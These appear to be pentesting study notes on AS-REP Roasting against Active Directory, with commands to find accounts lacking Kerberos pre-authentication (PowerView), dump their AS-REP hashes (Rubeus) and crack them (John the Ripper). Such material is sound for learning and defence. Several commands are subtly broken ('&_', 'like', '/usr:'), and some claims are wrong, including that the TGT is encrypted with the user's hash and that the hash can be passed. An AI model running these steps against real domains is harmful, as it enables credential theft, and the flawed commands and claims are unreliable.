
AS-REP Roasting is a technique used to exploit a misconfiguration in the Kerberos authentication protocol. 

- It specifically targets a vulnerability in the way Kerberos handles authentication requests. 
- In Kerberos protocol, When user wants to authenticate to a service, they send an authentication Service Request (AS-REQ) to the key distribution Centre (KDC). The KDC then responds with an Authentication Service Reply (AS-REP), which includes a ticket granting ticket (TGT). The TGT is encrypted using the user's password hash. 
- AS-REQ Roasting takes advantage of the fact that some users in AD may have the "Do not require Kerberos pre-authentication" option enabled. 
- This option allows the AS-REP to be requested without the need for the user's password. 

An Attacker can identify these vulnerable to accounts by querying the AD for accounts with this option enabled. 

### Practical

Tasks:
- Identify vulnerable accounts with enabled "Do not require pre-authentication" option.
- Exploit AS-REP Roasting to extract password hashes. 
- Crack hashes for plaintext passwords. 


### Identify Vulnerable accounts:

First, will load the powerview. Then will run the following command. 

```powershell
Get-DomainUser | where-object {&_.UserAccountControl like "*DONT_REQ_PREAUTH*" }
```

The above command will list all the user accounts which are vulnerable.


### Exploiting 

We will use Rubeus tool for this attack.

```powershell
.\Rubeus.exe asreproast /usr:johnny /outfile:hashes.txt
```


### Cracking Hashes:

Now we will use the john the ripper tool to crack the hash we found earlier. 

```powershell
.\john.exe .\hashes.txt --format=krb5asrep --wordlist=rockyou.txt
```


We can use the found password to login as the new user or we can also perform pass the hash attack without cracking the password. 

